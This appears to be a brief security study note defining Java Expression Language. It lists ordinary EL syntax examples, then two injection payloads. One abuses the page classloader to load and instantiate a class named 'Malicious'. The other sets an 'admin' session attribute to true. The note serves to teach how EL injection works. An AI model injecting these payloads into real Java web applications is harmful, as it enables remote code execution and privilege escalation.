---
tags:
  - security
  - web
aliases:
  - EL
---
A [[Templating Language]] used in java ecosystems.

```java
${customer.address["street"]}
${mySuit == "hearts"}
${customer.age + 20}
#{customer.age}
${requestScope[’javax.servlet.forward.servlet_path’]}
${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute("arr").toArray(pageContext.getClass().getClassLoader().getParent().getURLs())).loadClass("Malicious").newInstance()}
${pageContext.request.getSession().setAttribute("admin",true)}
```